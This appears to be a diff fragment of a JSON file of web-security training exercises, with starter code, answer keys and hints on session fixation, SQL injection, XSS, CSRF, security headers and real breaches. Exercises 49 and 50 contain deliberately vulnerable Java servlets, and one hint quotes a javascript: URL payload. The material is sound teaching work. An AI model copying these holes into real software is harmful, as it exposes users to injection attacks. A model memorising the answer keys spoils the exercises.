+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: Session Fixation",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "advanced",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 10,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// What is session fixation and how to prevent it?\n//\n// Attack flow:\n// 1. Attacker gets a session ID from the server: _____\n// 2. Attacker sends the session ID to the victim: _____\n// 3. Victim logs in using that session ID: _____\n// 4. Attacker uses the SAME session ID: _____\n//\n// Prevention: _____",
+          "expected_output": "Generate NEW session ID after login: request.getSession().invalidate(); request.getSession(true);",
+          "hints": [
+            {
+              "message": "Session fixation: attacker sets the session ID BEFORE the victim logs in."
+            },
+            {
+              "message": "After login, the old session ID (known to attacker) is now authenticated."
+            },
+            {
+              "message": "Prevention: invalidate old session and create new one on login."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Complete Security Audit",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "advanced",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 10,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// Perform a complete security audit of this servlet.\n// List EVERY issue and provide the fix:\n\nprotected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    String user = req.getParameter(\"user\");\n    String msg = req.getParameter(\"message\");\n    \n    Statement stmt = conn.createStatement();\n    stmt.executeUpdate(\"INSERT INTO messages VALUES ('\" + user + \"','\" + msg + \"')\");\n    \n    out.println(\"<p>\" + user + \" says: \" + msg + \"</p>\");\n}\n\n// Issues (there are 6+):\n// _____",
+          "expected_output": "6+ issues: SQL injection (2x), XSS (2x), no CSRF, no CSP, no cookie flags, no input validation.",
+          "hints": [
+            {
+              "message": "Check for: SQL injection, XSS, CSRF, cookie flags, CSP, input validation."
+            },
+            {
+              "message": "String concatenation in SQL = SQLi. String concatenation in HTML = XSS."
+            },
+            {
+              "message": "SQLi: 2 places. XSS: 2 places. Missing: CSRF, CSP, cookies, validation, PreparedStatement."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Fix Production Code",
+          "description": "Find and fix vulnerabilities in real code.",
+          "difficulty": "advanced",
+          "category": "Code Review & Bug Fixes",
+          "estimated_minutes": 10,
+          "ai_intro": "Code review is one of the most important skills in security. Practice finding every flaw!",
+          "starter_code": "// This is real-world production code. Fix it:\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {\n    resp.setContentType(\"text/html\");\n    String q = req.getParameter(\"q\");\n    String sort = req.getParameter(\"sort\");\n    \n    PrintWriter out = resp.getWriter();\n    out.println(\"<html><head><title>Search: \" + q + \"</title></head>\");\n    out.println(\"<body><h1>Results for \" + q + \"</h1>\");\n    \n    Statement stmt = conn.createStatement();\n    ResultSet rs = stmt.executeQuery(\n        \"SELECT * FROM products WHERE name LIKE '%\" + q + \"%' ORDER BY \" + sort);\n    while (rs.next()) {\n        out.println(\"<div>\" + rs.getString(\"name\") + \" - $\" + rs.getDouble(\"price\") + \"</div>\");\n    }\n    out.println(\"</body></html>\");\n}\n\n// Fix EVERY issue (8+ issues):",
+          "expected_output": "8+ issues: XSS in title, XSS in h1, XSS in body, SQL injection in q, SQL injection in sort, no CSP, no cookie flags, no input validation, database content not encoded.",
+          "hints": [
+            {
+              "message": "Count every place user input enters SQL or HTML without protection."
+            },
+            {
+              "message": "q goes into HTML title, h1, AND SQL query. sort goes into SQL ORDER BY."
+            },
+            {
+              "message": "8+ fixes: encode q in title/h1, PreparedStatement for q, whitelist for sort, encode DB output, add CSP, cookies, validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: MySpace Samy Worm Analysis",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// The Samy Worm (2005):\n// 1. What type of XSS was used? _____\n// 2. Where was the payload stored? _____\n// 3. How did it spread? _____\n// 4. How many profiles infected in 20 hours? _____\n// 5. What defences would have prevented it? (list 3)\n//    a) _____\n//    b) _____\n//    c) _____",
+          "expected_output": "1. Stored XSS\n2. MySpace user profiles\n3. Self-replicating: copied itself to each viewer's profile\n4. Over 1 million\n5. a) Output encoding b) CSP c) CSRF tokens on profile updates",
+          "hints": [
+            {
+              "message": "Samy used stored XSS in MySpace profiles to create a self-spreading worm."
+            },
+            {
+              "message": "Each infected profile became a new attack vector, creating exponential growth."
+            },
+            {
+              "message": "Output encoding, CSP, and CSRF tokens would each have blocked part of the attack."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: British Airways Breach",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// British Airways (2018): 380,000 payment cards stolen\n// Attackers injected a script into the payment page\n//\n// 1. What type of attack was likely used? _____\n// 2. What did the injected script do? _____\n// 3. What CSP header would have blocked it? _____\n// 4. What was the GDPR fine? _____\n// 5. List 3 defences that would have prevented this:\n//    a) _____\n//    b) _____\n//    c) _____",
+          "expected_output": "1. Script injection (likely supply chain or stored XSS)\n2. Captured payment card details and sent to attacker's server\n3. script-src 'self' (would block external script)\n4. 20 million pounds\n5. a) CSP b) Subresource Integrity c) Regular security audits",
+          "hints": [
+            {
+              "message": "The attackers injected a script that captured payment card details during checkout."
+            },
+            {
+              "message": "CSP with script-src 'self' would have blocked the external malicious script."
+            },
+            {
+              "message": "CSP, SRI (Subresource Integrity), and regular audits would have prevented or detected this."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: Design a Secure Comment System",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// Design a SECURE comment system for a blog:\n// Requirements: users can post text comments\n//\n// Input handling:\n//   Server-side validation: _____\n//   What to store in database: _____\n//\n// Output handling:\n//   How to display comments: _____\n//\n// Protection layers:\n//   CSRF: _____\n//   CSP: _____\n//   Cookie flags: _____",
+          "expected_output": "Validate: max length, strip dangerous chars. Store: raw text. Display: encodeHTML() on output. CSRF: token on form. CSP: script-src 'self'. Cookies: HttpOnly; Secure; SameSite=Lax.",
+          "hints": [
+            {
+              "message": "Store raw text, encode on output. This way the same data can be safely displayed in different contexts."
+            },
+            {
+              "message": "CSRF token on comment form prevents attackers from posting comments as the victim."
+            },
+            {
+              "message": "Complete: validate length, store raw, encode on display, CSRF token, CSP header, secure cookies."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: XSS in a Social Media Profile",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// A social media platform allows rich profiles with:\n// - Display name\n// - Bio (plain text)\n// - Website URL\n// - Profile picture URL\n//\n// For each field, what XSS risks exist and how to mitigate:\n// Display name: risk=_____ fix=_____\n// Bio: risk=_____ fix=_____\n// Website URL: risk=_____ fix=_____\n// Picture URL: risk=_____ fix=_____",
+          "expected_output": "Display name: XSS in HTML body, fix=encodeHTML. Bio: stored XSS, fix=encodeHTML. Website: javascript: protocol, fix=validate URL scheme (http/https only). Picture: onerror XSS, fix=validate URL + encode in src attribute.",
+          "hints": [
+            {
+              "message": "Each field has different XSS risks depending on where it appears in HTML."
+            },
+            {
+              "message": "Website URL is tricky: javascript:alert(1) is a valid URL but executes JS."
+            },
+            {
+              "message": "Validate URL scheme (must start with http:// or https://), encode all fields, validate picture URL."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Build a Security Header Checklist",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// Write a security header checklist for a web application:\n// For each header, write the recommended value:\n//\n// 1. Content-Security-Policy: _____\n// 2. X-Content-Type-Options: _____\n// 3. X-Frame-Options: _____\n// 4. X-XSS-Protection: _____\n// 5. Strict-Transport-Security: _____\n// 6. Set-Cookie (flags): _____\n// 7. Referrer-Policy: _____",
+          "expected_output": "1. default-src 'self'; script-src 'self'\n2. nosniff\n3. DENY\n4. 0 (disabled, rely on CSP)\n5. max-age=31536000; includeSubDomains\n6. HttpOnly; Secure; SameSite=Lax\n7. strict-origin-when-cross-origin",
+          "hints": [
+            {
+              "message": "CSP is the most impactful security header for XSS prevention."
+            },
+            {
+              "message": "X-Content-Type-Options: nosniff prevents MIME type sniffing attacks."
+            },
+            {
+              "message": "All 7 headers together provide comprehensive protection."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: Incident Response: XSS Detected",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 12,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// Your monitoring system detects XSS on your website.\n// Log entry: User submitted comment containing <script> tag\n//\n// Incident Response Steps:\n// 1. Immediate: _____\n// 2. Assess: _____\n// 3. Contain: _____\n// 4. Fix: _____\n// 5. Recover: _____\n// 6. Post-incident: _____",
+          "expected_output": "1. Block the malicious comment immediately\n2. Check how many users viewed it\n3. Invalidate affected sessions\n4. Add output encoding to comment display\n5. Notify affected users\n6. Add CSP, review all output points, add automated XSS scanning",
+          "hints": [
+            {
+              "message": "First priority: stop the bleeding (remove the malicious content)."
+            },
+            {
+              "message": "Check server logs to see how many users were exposed."
+            },
+            {
+              "message": "Full response: block, assess, contain, fix, recover, review."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: Design CSRF Protection for E-Commerce",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 12,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// Design CSRF protection for an e-commerce checkout:\n// Pages: Cart -> Shipping -> Payment -> Confirm -> Receipt\n//\n// Which pages need CSRF tokens? _____\n// Token generation strategy: _____\n// Token validation strategy: _____\n// What about AJAX requests? _____",
+          "expected_output": "All pages with forms need tokens. Generate per-session. Validate before processing. AJAX: send token in custom header (X-CSRF-Token).",
+          "hints": [
+            {
+              "message": "Every page that changes state (adds to cart, places order) needs CSRF protection."
+            },
+            {
+              "message": "For AJAX: include the token in a custom HTTP header instead of a form field."
+            },
+            {
+              "message": "Generate per-session, validate on every POST, include in both forms and AJAX headers."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Full Stack Security Architecture",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 12,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// Design the security architecture for a web application:\n// Components: Login, Dashboard, Profile, Settings, Admin\n//\n// For each, specify:\n// - CSP policy\n// - CSRF requirement\n// - Cookie configuration\n// - Input validation rules\n// - Output encoding strategy",
+          "expected_output": "Each component gets: CSP policy, CSRF on all POST forms, secure cookies, input validation rules, output encoding on all dynamic content.",
+          "hints": [
+            {
+              "message": "Each component may need different CSP policies (admin needs more restrictions)."
+            },
+            {
+              "message": "All POST forms need CSRF. All output needs encoding. All cookies need flags."
+            },
+            {
+              "message": "Build a matrix: components x security measures."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Penetration Testing Plan",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 12,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// Write a penetration testing plan for XSS/CSRF:\n// Target: A Java web application with user profiles and messaging\n//\n// Test 1: Reflected XSS\n//   Input fields to test: _____\n//   Payloads to try: _____\n//   Expected secure behaviour: _____\n//\n// Test 2: Stored XSS\n//   _____\n//\n// Test 3: CSRF\n//   _____\n//\n// Test 4: Session Security\n//   _____",
+          "expected_output": "Test reflected XSS on all input fields, test stored XSS on profiles and messages, test CSRF on all POST endpoints, test cookie flags and session management.",
+          "hints": [
+            {
+              "message": "Test every input field with standard XSS payloads."
+            },
+            {
+              "message": "For stored XSS, check profiles, messages, and any shared content."
+            },
+            {
+              "message": "Test CSRF by submitting forms from an external page without tokens."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Capstone: Secure Web Application",
+          "description": "Apply security knowledge to real-world scenarios.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 12,
+          "ai_intro": "These scenarios reflect real challenges security professionals face every day.",
+          "starter_code": "// CAPSTONE: Design a complete secure web application\n// Features: User registration, login, profiles, messaging\n//\n// For each feature, implement:\n// 1. Input validation\n// 2. Output encoding\n// 3. CSRF protection\n// 4. Session security\n// 5. CSP headers\n// 6. Error handling\n// 7. Security logging\n//\n// Write the security architecture document:",
+          "expected_output": "Complete architecture with all 7 security layers for each feature.",
+          "hints": [
+            {
+              "message": "Start with authentication (login/registration), then protect each feature."
+            },
+            {
+              "message": "Every feature needs all 7 layers of defence."
+            },
+            {
+              "message": "Complete architecture covering input validation, output encoding, CSRF, sessions, CSP, errors, logging."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
